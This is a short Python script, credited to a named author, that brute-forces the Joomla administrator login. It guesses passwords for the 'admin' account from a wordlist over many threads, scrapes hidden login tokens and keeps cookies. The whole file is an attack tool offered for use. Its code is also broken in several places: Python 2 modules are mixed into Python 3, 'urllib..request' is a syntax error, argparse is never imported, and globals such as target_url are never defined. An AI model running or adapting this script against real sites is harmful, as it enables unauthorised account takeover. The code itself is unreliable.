'''
	Made By Sai Harsha Kottapalli
	Tested on python3
	About	: 	Brute force joomla
	Use	 	:	Brute forcing joomla , retrieve login token and accept cookies 
'''

import urllib.request
import urllib.parse
import cookielib
import queue
from threading import *
from HTMLParser import *

class Parse_all(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name, value in attrs:
				if name == "name":
					tag_name = value
				if name == "value":
					tag_value = value

			if tag_name is not None:
				self.tag_results[tag_name] = value

class Bruter(object):
	def __init__(self, username, words):

		self.username = username
		self.password_q = words
		self.found = False
		print("Set: {0}".format(username))

	def run_bruteforce(self):

		for i in range(user_thread):
			t = Thread(target=self.web_bruter)
			t.start()

	def web_bruter(self):

		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().strip()
			jar = cookielib.FileCookieJar("cookies")
			opener = urllib.request.build_opener(urllib..request.HTTPCookieProcessor(jar))

			response = opener.open(target_url)

			page = response.read()

			print("Try: {0} : {1} ({2})".format(self.username, brute, self.password_q.qsize() ))

			# parse hidden fields
			parser = Parse_all()
			parser.feed(page)

			post_tags = parser.tag_results

			# post username and password (inputs)
			post_tags[username_input] = self.username
			post_tags[password_input] = brute

			login_data = urllib.parse.urlencode(post_tags)
			login_response = opener.open(target_post, login_data)

			login_result = login_response.read()

			if check in login_result:
				self.found = True

				print("[*]Bruteforce success. Results:")
				print("[*]Username: {0}".format(username))
				print("[*]Password: {0}".format(brute))
				print("[*]Other threads are exiting..")


def build_wordlist(file):
	f = open(file, "rb")
	raw_words = f.readlines()
	f.close()

	check_resume = False
	words = queue.Queue()

	for word in raw_words:
		word = word.strip()
		if resume is not None:
			if check_resume:
				words.put(word)
			else:
				if word == resume:
					check_resume = True
					print("Resuming wordlist from: {0}".format(resume))

		else:
			words.put(word)

	return words

def main():
	parser = argparse.ArgumentParser(description = "Brute force joomla")
	parser.add_argument("-f",action="store",dest="file",help="wordlist file")
	parser.add_argument("-ip",action="store",dest="ip",help="ip address")
	results = parser.parse_args()

	if results.file is None or results.ip is None:
		parser.print_help()
		exit(0)

	file = results.file
	ip = results.ip

	user_thread = 10
	username = "admin"
	check = "Super User" #for Joomla - 3.7.1
	resume = None

	# target specific settings
	url = "http://" + ip + "/administrator/index.php"
	post = "http://" + ip + "/administrator/index.php"

	username_input = "username"
	password_input = "passwd"
	
	words = build_wordlist(file)
	bruter_obj = Bruter(username, words)
	bruter_obj.run_bruteforce()

if __name__ == '__main__':
	main()